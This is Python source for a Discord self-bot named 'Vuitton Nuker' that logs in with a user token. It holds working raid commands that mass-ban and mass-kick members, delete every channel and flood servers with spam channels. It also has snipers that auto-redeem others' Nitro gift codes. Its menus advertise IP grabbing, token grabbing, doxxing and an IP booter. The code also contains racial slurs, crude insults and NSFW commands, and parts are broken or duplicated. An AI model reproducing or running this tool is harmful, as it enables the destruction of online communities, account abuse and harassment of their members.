class NUKER():
    __version__ = 1.0

import keep_alive
keep_alive.keep_alive()    
import subprocess, sys, time, os, colorama, base64, codecs, datetime, io, random, numpy, datetime, smtplib, string, ctypes
from discord.ext.commands.core import group
import requests
import random
import discord
from discord.ext.commands import bot
from requests.sessions import Request
import termcolor
import colorama
import webbrowser
import json
import string
import time
import aiohttp, asyncio, functools, logging
import io
import locale
import sys
from datetime import timedelta
from sys import platform
from PIL import Image
from gtts import gTTS
from bs4 import BeautifulSoup as bs4
from urllib.parse import urlencode
from pymongo import MongoClient
from selenium import webdriver
from threading import Thread
from subprocess import call
from itertools import cycle
from discord.ext import commands
from discord.ext import tasks
from termcolor import colored
from colorama import Fore, init

with open('config.json') as f:
    config = json.load(f)

token = config.get('token')
password = config.get('password')
prefix = config.get('prefix')

giveaway_sniper = config.get('giveaway_sniper')
slotbot_sniper = config.get('slotbot_sniper')
nitro_sniper = config.get('nitro_sniper')
privnote_sniper = config.get('privnote_sniper')

stream_url = config.get('stream_url')
tts_language = config.get('tts_language')

bitly_key = config.get('bitly_key')
cat_key = config.get('cat_key')
weather_key = config.get('weather_key')
cuttly_key = config.get('cuttly_key')

width = os.get_terminal_size().columns
start_time = datetime.datetime.utcnow()
loop = asyncio.get_event_loop()

token = ("token here")
password = ('password')
prefix = ('prefix here')


vuitton = commands.Bot(command_prefix=prefix, self_bot=True)
vuitton.remove_command('help')

os.system('cls')
print(f'{Fore.RED}STARTING UP NUKER ...')

def Nitro():
    code = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    return f'https://discord.gift/{code}'

@vuitton.event
async def on_message(message):


    def GiveawayData():
        print(
        f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
        f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"   
    +Fore.RESET)

    def SlotBotData():
        print(
        f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]"
        f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"   
    +Fore.RESET)  

    def NitroData(elapsed, code):
        print(
        f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]" 
        f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"
        f"\n{Fore.WHITE} - AUTHOR: {Fore.YELLOW}[{message.author}]"
        f"\n{Fore.WHITE} - ELAPSED: {Fore.YELLOW}[{elapsed}]"
        f"\n{Fore.WHITE} - CODE: {Fore.YELLOW}{code}"
    +Fore.RESET)

    def PrivnoteData(code):
        print(
        f"{Fore.WHITE} - CHANNEL: {Fore.YELLOW}[{message.channel}]" 
        f"\n{Fore.WHITE} - SERVER: {Fore.YELLOW}[{message.guild}]"
        f"\n{Fore.WHITE} - CONTENT: {Fore.YELLOW}[The content can be found at Privnote/{code}.txt]"
    +Fore.RESET)

    time = datetime.datetime.now().strftime("%H:%M %p")  
    if 'discord.gift/' in message.content:
            start = datetime.datetime.now()
            code = re.search("discord.gift/(.*)", message.content).group(1)
            token = config.get('token')
                
            headers = {'Authorization': token}
            r = requests.post(
                f'https://discordapp.com/api/v6/entitlements/gift-codes/{code}/redeem', 
                headers=headers,
            ).text
        
            elapsed = datetime.datetime.now() - start
            elapsed = f'{elapsed.seconds}.{elapsed.microseconds}'

            if 'This gift has been redeemed already.' in r:
                print(""
                f"\n{Fore.CYAN}[{time} - Nitro Already Redeemed]"+Fore.RESET)
                NitroData(elapsed, code)

            elif 'subscription_plan' in r:
                print(""
                f"\n{Fore.CYAN}[{time} - Nitro Success]"+Fore.RESET)
                NitroData(elapsed, code)

            elif 'Unknown Gift Code' in r:
                print(""
                f"\n{Fore.CYAN}[{time} - Nitro Unknown Gift Code]"+Fore.RESET)
                NitroData(elapsed, code)

            elif 'You are being rate limited.' in r:
                print(""
                f"\n{Fore.CYAN}[{time} - Ratelimited]"+Fore.RESET)  
                NitroData(elapsed, code)

    if 'Someone just dropped' in message.content:
        if slotbot_sniper == True:
            if message.author.id == 346353957029019648:
                try:
                    await message.channel.send('~grab')
                except discord.errors.Forbidden:
                    print(""
                    f"\n{Fore.CYAN}[{time} - SlotBot Couldnt Grab]"+Fore.RESET)
                    SlotBotData()                     
                print(""
                f"\n{Fore.CYAN}[{time} - Slotbot Grabbed]"+Fore.RESET)
                SlotBotData()
        else:
            return

    if 'GIVEAWAY' in message.content:
        if giveaway_sniper == True:
            if message.author.id == 294882584201003009:
                try:    
                    await message.add_reaction("🎉")
                except discord.errors.Forbidden:
                    print(""
                    f"\n{Fore.CYAN}[{time} - Giveaway Couldnt React]"+Fore.RESET)
                    GiveawayData()            
                print(""
                f"\n{Fore.CYAN}[{time} - Giveaway Sniped]"+Fore.RESET)
                GiveawayData()
        else:
            return

    if f'Congratulations <@{vuitton.user.id}>' in message.content:
        if giveaway_sniper == True:
            if message.author.id == 294882584201003009:    
                print(""
                f"\n{Fore.CYAN}[{time} - Giveaway Won]"+Fore.RESET)
                GiveawayData()
        else:
            return

    await vuitton.process_commands(message)


@vuitton.event
async def on_connect():
    Clear()

    if giveaway_sniper == True:
        giveaway = "Active" 
    else:
        giveaway = "Disabled"

    if nitro_sniper == True:
        nitro = "Active"
    else:
        nitro = "Disabled"

    if slotbot_sniper == True:
        slotbot = "Active"
    else:
        slotbot = "Disabled"




@vuitton.event
async def on_connect():
    os.system('cls')
    print(f'''{Fore.YELLOW}


██████████████████████████████████████████████████████████████████████████████████████████████████████████████
█░░░░░░██░░░░░░█░░░░░░██░░░░░░█░░░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░██████████░░░░░░█
█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░░░░░░░░░██░░▄▀░░█
█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░░░▄▀░░░░█░░░░░░▄▀░░░░░░█░░░░░░▄▀░░░░░░█░░▄▀░░░░░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░██░░▄▀░░█
█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░███░░▄▀░░███████░░▄▀░░█████████░░▄▀░░█████░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░██░░▄▀░░█
█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░███░░▄▀░░███████░░▄▀░░█████████░░▄▀░░█████░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░██░░▄▀░░█
█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░███░░▄▀░░███████░░▄▀░░█████████░░▄▀░░█████░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░██░░▄▀░░█
█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░███░░▄▀░░███████░░▄▀░░█████████░░▄▀░░█████░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░██░░▄▀░░█
█░░▄▀▄▀░░▄▀▄▀░░█░░▄▀░░██░░▄▀░░███░░▄▀░░███████░░▄▀░░█████████░░▄▀░░█████░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░░░░░▄▀░░█
█░░░░▄▀▄▀▄▀░░░░█░░▄▀░░░░░░▄▀░░█░░░░▄▀░░░░█████░░▄▀░░█████████░░▄▀░░█████░░▄▀░░░░░░▄▀░░█░░▄▀░░██░░▄▀▄▀▄▀▄▀▄▀░░█
███░░░░▄▀░░░░███░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀░░█████░░▄▀░░█████████░░▄▀░░█████░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░░░░░░░░░▄▀░░█
█████░░░░░░█████░░░░░░░░░░░░░░█░░░░░░░░░░█████░░░░░░█████████░░░░░░█████░░░░░░░░░░░░░░█░░░░░░██████████░░░░░░█
██████████████████████████████████████████████████████████████████████████████████████████████████████████████
██████████████████████████████████████████████████████████████████████████████████████████
█░░░░░░██████████░░░░░░█░░░░░░██░░░░░░█░░░░░░██░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░░░███
█░░▄▀░░░░░░░░░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀░░███
█░░▄▀▄▀▄▀▄▀▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░░░█░░▄▀░░░░░░░░░░█░░▄▀░░░░░░░░▄▀░░███
█░░▄▀░░░░░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░███░░▄▀░░█████████░░▄▀░░████░░▄▀░░███
█░░▄▀░░██░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░███░░▄▀░░░░░░░░░░█░░▄▀░░░░░░░░▄▀░░███
█░░▄▀░░██░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░███░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀▄▀░░███
█░░▄▀░░██░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░░░░░▄▀░░███░░▄▀░░░░░░░░░░█░░▄▀░░░░░░▄▀░░░░███
█░░▄▀░░██░░▄▀░░░░░░▄▀░░█░░▄▀░░██░░▄▀░░█░░▄▀░░██░░▄▀░░███░░▄▀░░█████████░░▄▀░░██░░▄▀░░█████
█░░▄▀░░██░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░░░░░▄▀░░█░░▄▀░░██░░▄▀░░░░█░░▄▀░░░░░░░░░░█░░▄▀░░██░░▄▀░░░░░░█
█░░▄▀░░██░░░░░░░░░░▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░██░░▄▀▄▀▄▀░░█
█░░░░░░██████████░░░░░░█░░░░░░░░░░░░░░█░░░░░░██░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░██░░░░░░░░░░█
██████████████████████████████████████████████████████████████████████████████████████████                                                 
        
                                
    ''')
    print(f'{Fore.YELLOW}                      SKIDS L')
    print(f'{Fore.YELLOW}                      NUKER VERSION {NUKER.__version__}')
    print(f'{Fore.YELLOW}                      Logged in as: {vuitton.user.name}#{vuitton.user.discriminator}')
    print(f'{Fore.YELLOW}                      Prefix {prefix}')


languages = {
    'hu'    : 'Hungarian, Hungary',
    'nl'    : 'Dutch, Netherlands',
    'no'    : 'Norwegian, Norway',
    'pl'    : 'Polish, Poland',
    'pt-BR' : 'Portuguese, Brazilian, Brazil',
    'ro'    : 'Romanian, Romania',
    'fi'    : 'Finnish, Finland',
    'sv-SE' : 'Swedish, Sweden',
    'vi'    : 'Vietnamese, Vietnam',
    'tr'    : 'Turkish, Turkey',
    'cs'    : 'Czech, Czechia, Czech Republic',
    'el'    : 'Greek, Greece',
    'bg'    : 'Bulgarian, Bulgaria',
    'ru'    : 'Russian, Russia',
    'uk'    : 'Ukranian, Ukraine',
    'th'    : 'Thai, Thailand',
    'zh-CN' : 'Chinese, China',
    'ja'    : 'Japanese',
    'zh-TW' : 'Chinese, Taiwan',
    'ko'    : 'Korean, Korea'
}

locales = [ 
    "da", "de",
    "en-GB", "en-US",
    "es-ES", "fr",
    "hr", "it",
    "lt", "hu",
    "nl", "no",
    "pl", "pt-BR",
    "ro", "fi",
    "sv-SE", "vi",
    "tr", "cs",
    "el", "bg",
    "ru", "uk",
    "th", "zh-CN",
    "ja", "zh-TW",
    "ko"
]
m_numbers = [
    ":one:",
    ":two:", 
    ":three:", 
    ":four:", 
    ":five:", 
    ":six:"
]

m_offets = [
    (-1, -1),
    (0, -1),
    (1, -1),
    (-1, 0),
    (1, 0),
    (-1, 1),
    (0, 1),
    (1, 1)
]

@vuitton.command()   
async def help(ctx):
    embed = discord.Embed(title=" Vuitton Nuker ", color= discord.Color(random.randint(0xffffff, 0xffffff)))
    embed.set_thumbnail(url="")
    embed.add_field(name=prefix+"**Raid**", value="Shows Raid Commands.\n", inline=False)
    embed.add_field(name=prefix+"**Hacking**", value="Shows Status Commands.\n", inline=False)
    embed.add_field(name=prefix+"**Status**", value="Shows Info Commands.\n", inline=False)  
    embed.add_field(name=prefix+"**Text**", value="Shows Text Commands.\n", inline=False)
    embed.add_field(name=prefix+"**Fun**", value="Shows Text 2 Commands.\n", inline=False)
    embed.add_field(name=prefix+"**NSFW**", value="Shows NSFW Commands.\n", inline=False)
    embed.add_field(name=prefix+"**Info**", value="Shows Info Commands.\n", inline=False)
    embed.add_field(name=prefix+"**Playlist**", value="Gives 2020 Lit Playlist Emo/Rap underated.\n", inline=False)
    embed.set_footer(text=f"Request by {ctx.author}", icon_url=ctx.author.avatar_url)
    embed.set_image(url="")
    await ctx.send(embed=embed)

@vuitton.command()   
async def raid(ctx):
    embed = discord.Embed(title=" Vuitton Nuker ", color= discord.Color(random.randint(0xffffff, 0xffffff)))
    embed.set_thumbnail(url="")
    embed.add_field(name=prefix+"**wizz**", value="Nukes the server.\n", inline=False)
    embed.add_field(name=prefix+"**massrole**", value="massrole <name>\n", inline=False)
    embed.add_field(name=prefix+"**ban**", value="Mass Ban\n", inline=False)
    embed.add_field(name=prefix+"**kick**", value="Mass Kick\n", inline=False)  
    embed.add_field(name=prefix+"**massc**", value="MassChannels\n", inline=False)
    embed.add_field(name=prefix+"**zoom**", value="Deletes everything\n", inline=False)
    embed.set_footer(text=f"Request by {ctx.author}", icon_url=ctx.author.avatar_url)
    embed.set_image(url="https://images-ext-1.discordapp.net/external/5HowBHCGOdiOxGepyooIrbt0n9E07pErW4Qgk3rQA7E/https/images-ext-2.discordapp.net/external/nLNvmlnChwiuJIGJB-BHvg7T6iNfw9RasPv61Yxd9s8/%253Fsize%253D256%2526f%253D.gif/https/cdn.discordapp.com/avatars/577455997216489473/a_410c25ea350611bed2db3ced087050d4.gif?format=png")
    await ctx.send(embed=embed)

@vuitton.command()   
async def playlist(ctx):
    embed = discord.Embed(title=" Vuitton Nuker ", color= discord.Color(random.randint(0xffffff, 0xffffff)))
    embed.set_thumbnail(url="")
    embed.add_field(name="**RAP MUSIC**", value="https://www.youtube.com/playlist?list=PLZ52ZJuOT1NAdcOQRxd53IztWTLvF5QKd\n", inline=False)
    embed.add_field(name="**EMO MUSIC**", value="https://www.youtube.com/playlist?list=PLZ52ZJuOT1NBGaEWYhH3QvkDeIIKFYX3h\n", inline=False)
    embed.set_footer(text=f"Request by {ctx.author}", icon_url=ctx.author.avatar_url)
    embed.set_image(url="https://images-ext-1.discordapp.net/external/5HowBHCGOdiOxGepyooIrbt0n9E07pErW4Qgk3rQA7E/https/images-ext-2.discordapp.net/external/nLNvmlnChwiuJIGJB-BHvg7T6iNfw9RasPv61Yxd9s8/%253Fsize%253D256%2526f%253D.gif/https/cdn.discordapp.com/avatars/577455997216489473/a_410c25ea350611bed2db3ced087050d4.gif?format=png")
    await ctx.send(embed=embed)

@vuitton.command()   
async def status(ctx):
    embed = discord.Embed(title=" Vuitton Nuker ", color= discord.Color(random.randint(0xffffff, 0xffffff)))
    embed.set_thumbnail(url="")
    embed.add_field(name=prefix+"**stream**", value="Streams.\n", inline=False)
    embed.add_field(name=prefix+"**game**", value="Games.\n", inline=False)
    embed.add_field(name=prefix+"**watch**", value="Watches.\n", inline=False)  
    embed.add_field(name=prefix+"**listen**", value="Listens.\n", inline=False)
    embed.set_footer(text=f"Request by {ctx.author}", icon_url=ctx.author.avatar_url)
    embed.set_image(url="https://images-ext-1.discordapp.net/external/5HowBHCGOdiOxGepyooIrbt0n9E07pErW4Qgk3rQA7E/https/images-ext-2.discordapp.net/external/nLNvmlnChwiuJIGJB-BHvg7T6iNfw9RasPv61Yxd9s8/%253Fsize%253D256%2526f%253D.gif/https/cdn.discordapp.com/avatars/577455997216489473/a_410c25ea350611bed2db3ced087050d4.gif?format=png")
    await ctx.send(embed=embed)

@vuitton.command()   
async def hacking(ctx):
    embed = discord.Embed(title=" Vuitton Nuker ", color= discord.Color(random.randint(0xffffff, 0xffffff)))
    embed.set_thumbnail(url="")
    embed.add_field(name=prefix+"**ddox**", value="grabs there ip.\n", inline=False)
    embed.add_field(name=prefix+"**token @user**", value="Finds Half Token\n", inline=False)
    embed.add_field(name=prefix+"**snipe**", value="Snipes Deleted Message\n", inline=False)  
    embed.add_field(name=prefix+"**boot <ip>**", value="boots a ip offine`\n", inline=False)
    embed.set_footer(text=f"Request by {ctx.author}", icon_url=ctx.author.avatar_url)
    embed.set_image(url="https://images-ext-1.discordapp.net/external/5HowBHCGOdiOxGepyooIrbt0n9E07pErW4Qgk3rQA7E/https/images-ext-2.discordapp.net/external/nLNvmlnChwiuJIGJB-BHvg7T6iNfw9RasPv61Yxd9s8/%253Fsize%253D256%2526f%253D.gif/https/cdn.discordapp.com/avatars/577455997216489473/a_410c25ea350611bed2db3ced087050d4.gif?format=png")
    await ctx.send(embed=embed)

@vuitton.command()   
async def text(ctx):
    embed = discord.Embed(title=" Vuitton Nuker ", color= discord.Color(random.randint(0xffffff, 0xffffff)))
    embed.set_thumbnail(url="")
    embed.add_field(name=prefix+"**ipsearch**", value="give information about the ip.\n", inline=False)
    embed.add_field(name=prefix+"**corona**", value="gives u how much covid-19 cases\n", inline=False)
    embed.add_field(name=prefix+"**ytsearch**", value="looks up yt <link>\n", inline=False)  
    embed.add_field(name=prefix+"**stats**", value="shows u how much time the bot has been hosted\n", inline=False)
    embed.add_field(name=prefix+"**whitelist**", value="**only can be done by the owner** | shows u the list of people taht are whitelisted\n", inline=False)
    embed.add_field(name=prefix+"**unwhitelist**", value="**only can be done by the owner** | unwhitelist the person so the person cant use the bot no more\n", inline=False)
    embed.add_field(name=prefix+"**whois @user**", value="shows u whois <@user>\n", inline=False) 
    embed.set_footer(text=f"Request by {ctx.author}", icon_url=ctx.author.avatar_url)
    embed.set_image(url="https://images-ext-1.discordapp.net/external/5HowBHCGOdiOxGepyooIrbt0n9E07pErW4Qgk3rQA7E/https/images-ext-2.discordapp.net/external/nLNvmlnChwiuJIGJB-BHvg7T6iNfw9RasPv61Yxd9s8/%253Fsize%253D256%2526f%253D.gif/https/cdn.discordapp.com/avatars/577455997216489473/a_410c25ea350611bed2db3ced087050d4.gif?format=png")
    await ctx.send(embed=embed)

@vuitton.command()   
async def fun(ctx):
    embed = discord.Embed(title=" Vuitton Nuker ", color= discord.Color(random.randint(0xffffff, 0xffffff)))
    embed.set_thumbnail(url="")
    embed.add_field(name=prefix+"**gay @user**", value="gay rate the user.\n", inline=False)
    embed.add_field(name=prefix+"**dick**", value="how long yo dick is.\n", inline=False)
    embed.add_field(name=prefix+"**fight @user**", value="WRLD STARR THEY FINNA START A FIGHT.\n", inline=False)  
    embed.add_field(name=prefix+"**giveaway**", value="starts a simple giveaway.\n", inline=False)
    embed.add_field(name=prefix+"**bottleflip**", value="**Flips Bottle**.\n", inline=False)
    embed.add_field(name=prefix+"**whois @user**", value="shows u whois <@user>\n", inline=False)
    embed.add_field(name=prefix+"**dox @user**", value="check in dox.txt there real info\n", inline=False)
    embed.add_field(name=prefix+"**8ball**", value="yes or no my niggah\n", inline=False)
    embed.add_field(name=prefix+"**fancy**", value="fancy <text>\n", inline=False)
    embed.add_field(name=prefix+"**copy**", value="copys server - **ONLY CHANNELS**\n", inline=False)
    embed.add_field(name=prefix+"**fm**", value="sends the first message of the channel/dms\n", inline=False)
    embed.set_footer(text=f"Request by {ctx.author}", icon_url=ctx.author.avatar_url)
    embed.set_image(url="https://images-ext-1.discordapp.net/external/5HowBHCGOdiOxGepyooIrbt0n9E07pErW4Qgk3rQA7E/https/images-ext-2.discordapp.net/external/nLNvmlnChwiuJIGJB-BHvg7T6iNfw9RasPv61Yxd9s8/%253Fsize%253D256%2526f%253D.gif/https/cdn.discordapp.com/avatars/577455997216489473/a_410c25ea350611bed2db3ced087050d4.gif?format=png")
    await ctx.send(embed=embed)

@vuitton.command()   
async def nsfw(ctx):
    embed = discord.Embed(title=" Vuitton Nuker ", color= discord.Color(random.randint(0xffffff, 0xffffff)))
    embed.set_thumbnail(url="")
    embed.add_field(name=prefix+"**boobs**", value="||shows boobs image||.\n", inline=False)
    embed.add_field(name=prefix+"**fuck @user**", value="||fuck @user||\n", inline=False)
    embed.add_field(name=prefix+"**kiss**", value="||kiss @user||\n", inline=False)  
    embed.add_field(name=prefix+"**slap**", value="||slap @user||\n", inline=False)
    embed.add_field(name=prefix+"**blowjob**", value="||shows blowjob image||\n", inline=False)
    embed.set_footer(text=f"Request by {ctx.author}", icon_url=ctx.author.avatar_url)
    embed.set_image(url="https://images-ext-1.discordapp.net/external/5HowBHCGOdiOxGepyooIrbt0n9E07pErW4Qgk3rQA7E/https/images-ext-2.discordapp.net/external/nLNvmlnChwiuJIGJB-BHvg7T6iNfw9RasPv61Yxd9s8/%253Fsize%253D256%2526f%253D.gif/https/cdn.discordapp.com/avatars/577455997216489473/a_410c25ea350611bed2db3ced087050d4.gif?format=png")
    await ctx.send(embed=embed)

@vuitton.command()   
async def info(ctx):
    embed = discord.Embed(title=" **BOT DEV** ", color= discord.Color(random.randint(0xffffff, 0xffffff)))
    embed.set_thumbnail(url="")
    embed.add_field(name="**2vuitton**", value="Developer/Coder.\n", inline=False)
    embed.add_field(name="**4vuitton**", value="Clan Owner\n", inline=False)
    embed.set_footer(text=f"Request by {ctx.author}", icon_url=ctx.author.avatar_url)
    embed.set_image(url="https://images-ext-1.discordapp.net/external/5HowBHCGOdiOxGepyooIrbt0n9E07pErW4Qgk3rQA7E/https/images-ext-2.discordapp.net/external/nLNvmlnChwiuJIGJB-BHvg7T6iNfw9RasPv61Yxd9s8/%253Fsize%253D256%2526f%253D.gif/https/cdn.discordapp.com/avatars/577455997216489473/a_410c25ea350611bed2db3ced087050d4.gif?format=png")
    await ctx.send(embed=embed)

@vuitton.command()
async def wizz(ctx):
    await ctx.message.delete()
    print(f"{Fore.YELLOW}Nuking the server")
    for users in ctx.guild.members:
        try:
            await users.ban()
            print(f"{Fore.YELLOW}Banned")
        except:
            print(f"{Fore.YELLOW}Failed To Ban")
            print(f"{Fore.YELLOW}VUITTON OWNS YOU ")
    for channel in ctx.guild.channels:
            await channel.delete()
            print(f"{Fore.YELLOW}Deleted {channel.name}")
    for i in range(1, 40):
            await ctx.guild.create_text_channel(name=f'vuitton hoed you {i}')
            await ctx.guild.create_voice_channel(name=f'vuitton hoed you {i}')
            await ctx.guild.create_category(name=f'vuitton hoed you {i}')
            print(f"{Fore.YELLOW}Added {channel.name}")
  
@vuitton.command()
async def ban(ctx):
    await ctx.message.delete()
    await ctx.send("`Enabling ban sequence `")
    show_avatar = discord.Embed(

     color=ctx.author.color 
    )
    show_avatar.set_image(url='https://media.discordapp.net/attachments/777919626579410955/780143996482748446/DlDlX9w.png')
    await ctx.send(embed=show_avatar)
    for user in list(ctx.guild.members):
        try:
            await ctx.guild.ban(user)
            print (f"{user.name} has been banned from {ctx.guild.name}")
        except:
            print (f"{user.name} has NOT been banned from {ctx.guild.name}")

@vuitton.command()
async def kick(ctx):
    await ctx.message.delete()
    await ctx.send("`vuitton hoed you `")
    show_avatar = discord.Embed(

     color=ctx.author.color 
    )
    show_avatar.set_image(url='https://media.discordapp.net/attachments/777919626579410955/780143996482748446/DlDlX9w.png')
    await ctx.send(embed=show_avatar)
    for user in list(ctx.guild.members):
        try:
            await ctx.guild.kick(user)
            print (f"{user.name} kicked from {ctx.guild.name}")
        except:
            print (f"{user.name} has NOT been kicked from {ctx.guild.name}")


@vuitton.command()
async def massc(ctx):
  await ctx.message.delete()
  print(f"{Fore.RED} Deleting Channels...")
  for channel in ctx.guild.channels:
    await channel.delete()
  print(f"{Fore.RED}Creating Channels...")
  for i in range(100):
    await ctx.guild.create_text_channel(name=f'vuitton hoed you ')
    print(f"{Fore.RED}Added {channel.name}")

@vuitton.command()
async def zoom(ctx):
  await ctx.message.delete()
  print(f"{Fore.RED}Deleting Channels . . .")
  for channel in ctx.guild.channels:
    await channel.delete()
  print(f"{Fore.RED} Channels Deleted")

@vuitton.command()
async def av(ctx, user: discord.Member=None): # b'\xfc'
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    try:
        em = discord.Embed(description=f"https://images.google.com/searchbyimage?image_url={user.avatar_url}")
        await ctx.send(embed=em)
    except Exception as e:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)

@vuitton.command()
async def whois(ctx, *, user: discord.Member = None): # b'\xfc'
    await ctx.message.delete()
    if user is None:
        user = ctx.author      
    date_format = "%a, %d %b %Y %I:%M %p"
    em = discord.Embed(description=user.mention)
    em.set_author(name=str(user), icon_url=user.avatar_url)
    em.set_thumbnail(url=user.avatar_url)
    em.add_field(name="Joined", value=user.joined_at.strftime(date_format))
    members = sorted(ctx.guild.members, key=lambda m: m.joined_at)
    em.add_field(name="Join position", value=str(members.index(user)+1))
    em.add_field(name="Registered", value=user.created_at.strftime(date_format))
    if len(user.roles) > 1:
        role_string = ' '.join([r.mention for r in user.roles][1:])
        em.add_field(name="Roles [{}]".format(len(user.roles)-1), value=role_string, inline=False)
    perm_string = ', '.join([str(p[0]).replace("_", " ").title() for p in user.guild_permissions if p[1]])
    em.add_field(name="Guild permissions", value=perm_string, inline=False)
    em.set_footer(text='ID: ' + str(user.id))
    return await ctx.send(embed=em)

@vuitton.command()
async def blowjob(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/blowjob")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@vuitton.command(aliases=['dong', 'penis'])
async def dick(ctx, *, user: discord.Member = None): # b'\xfc'
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    size = random.randint(1, 15)
    dong = ""
    for _i in range(0, size):
        dong += "="
    em = discord.Embed(title=f"{user}'s Dick size", description=f"8{dong}D", colour=0x0000)
    await ctx.send(embed=em)

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue


@vuitton.command()
async def stream(ctx, *, message): 
    await ctx.message.delete()
    stream = discord.Streaming(
        name=message,
        url="https://www.twitch.tv/vuitton", 
    )
    await vuitton.change_presence(activity=stream)

@vuitton.command()
async def game(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    game = discord.Game(
        name=message
    )
    await vuitton.change_presence(activity=game)

@vuitton.command()
async def watch(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    await vuitton.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.watching, 
            name=message
        ))

@vuitton.command()
async def listen(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    await vuitton.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.listening, 
            name=message, 
        ))

@vuitton.command(name='8ball')
async def _ball(ctx, *, question): # b'\xfc'
    await ctx.message.delete()
    responses = [
      'no',
      'maybe',
      'yes',
      'idk nigga',
      'your moms a hoe',
	  'yo dad a snitch like 6ix9ine',
	  'yo dad a pussy like u'
    ]
    answer = random.choice(responses)
    embed = discord.Embed()
    embed.add_field(name="Question", value=question, inline=False)
    embed.add_field(name="Answer", value=answer, inline=False)
    embed.set_thumbnail(url="https://www.horoscope.com/images-US/games/game-magic-8-ball-no-text.png")
    embed.set_footer(text=datetime.datetime.now())
    await ctx.send(embed=embed)

@vuitton.command()
async def joke(ctx):  # b'\xfc'
    await ctx.message.delete()
    headers = {
        "Accept": "application/json"
    }
    async with aiohttp.ClientSession()as session:
        async with session.get("https://icanhazdadjoke.com", headers=headers) as req:
            r = await req.json()
    await ctx.send(r["joke"])

@vuitton.command()
async def fancy(ctx, *, text): # b'\xfc'
    await ctx.message.delete()
    r = requests.get(f'http://artii.herokuapp.com/make?text={urllib.parse.quote_plus(text)}').text
    if len('```'+r+'```') > 2000:
        return
    await ctx.send(f"```{r}```")

@vuitton.command()
async def slap(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/slap")
    res = r.json()
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(res['url']) as resp:
                image = await resp.read()
        with io.BytesIO(image) as file:
            await ctx.send(user.mention, file=discord.File(file, f"vuitton_slap.gif"))
    except:
        em = discord.Embed(description=user.mention)
        em.set_image(url=res['url'])
        await ctx.send(embed=em)

@vuitton.command()
async def boobs(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/boobs")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)  

@vuitton.command(name='groupleaver', aliase=['leaveallgroups', 'leavegroup', 'leavegroups'])
async def group(ctx): 
    await ctx.message.delete()
    for channel in vuitton.private_channels:
        if isinstance(channel, discord.GroupChannel):
            await channel.leave()       

@vuitton.command()
async def whitelist(ctx):
    await ctx.message.delete()
    await ctx.send("You Have Whitelisted")

@vuitton.command()
async def unwhitelist(ctx):
    await ctx.message.delete()
    await ctx.send("hahahaha bitch u got unwhitelist for being a bitch")
            
@vuitton.command()
async def purge(ctx, amount: int): 
    await ctx.message.delete()
    async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == vuitton.user).map(lambda m: m):
        try:
           await message.delete()
        except:
            pass
       
@vuitton.command()
async def stats(ctx): 
    await ctx.message.delete()
